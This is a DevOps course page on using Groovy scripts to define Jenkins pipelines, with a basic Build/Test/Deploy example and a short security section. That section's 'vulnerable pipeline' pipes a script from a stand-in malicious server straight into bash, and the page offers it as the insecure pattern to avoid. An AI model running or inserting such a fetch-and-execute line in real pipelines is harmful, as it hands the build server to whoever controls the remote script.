---
course: DevOps
topic: DevOps Bootcamp
tags: [devops]
---

## Groovy Scripts in Jenkins

### What is Groovy?

Groovy is a dynamic programming language for the Java platform. It is often used in Jenkins for defining pipelines due to its flexibility and ease of integration with Java-based systems.

### Why Use Groovy Scripts in Jenkins?

Groovy scripts provide a powerful way to define complex Jenkins pipelines. They allow for:

1. **Dynamic Pipeline Definition**: Groovy scripts can dynamically generate pipeline steps based on conditions.
2. **Reusability**: Common tasks can be encapsulated in reusable functions.
3. **Integration with Java**: Groovy integrates seamlessly with Java, allowing for easy interaction with existing Java libraries.

### How Does Groovy Work in Jenkins?

Jenkins uses a Groovy-based DSL (Domain Specific Language) to define pipelines. These scripts are executed within a sandbox environment to prevent malicious actions.

### Example: Basic Jenkins Pipeline Script

```groovy
pipeline {
    agent any

    stages {
        stage('Build') {
            steps {
                echo 'Building...'
            }
        }
        stage('Test') {
            steps {
                echo 'Testing...'
            }
        }
        stage('Deploy') {
            steps {
                echo 'Deploying...'
            }
        }
    }
}
```

This script defines a simple pipeline with three stages: Build, Test, and Deploy.

### Real-World Example: Jenkins Pipeline Security

A common security issue in Jenkins pipelines is the execution of untrusted scripts. This can lead to arbitrary code execution and potential compromise of the Jenkins server.

#### Vulnerable Pipeline

```groovy
pipeline {
    agent any

    stages {
        stage('Untrusted Script') {
            steps {
                sh 'curl http://malicious-server.com/script.sh | bash'
            }
        }
    }
}
```

#### Secure Pipeline

```groovy
pipeline {
    agent any

    stages {
        stage('Trusted Script') {
            steps {
                sh './trusted-script.sh'
            }
        }
    }
}
```

### How to Prevent / Defend

1. **Use Trusted Sources**: Ensure scripts are sourced from trusted repositories.
2. **Code Review**: Regularly review pipeline scripts for security vulnerabilities.
3. **Use Jenkins Security Features**: Enable Jenkins security features such as the Groovy Sandbox to restrict script execution.

---
<!-- nav -->
[[07-Introduction to Scripted Pipelines Using Groovy|Introduction to Scripted Pipelines Using Groovy]] | [[DevOps/DevOps Bootcamp/06-CI CD & Build Tools/16-Creating Pipelines Using Groovy Scripts/00-Overview|Overview]] | [[DevOps/DevOps Bootcamp/06-CI CD & Build Tools/16-Creating Pipelines Using Groovy Scripts/09-Hands-On Practice|Hands-On Practice]]
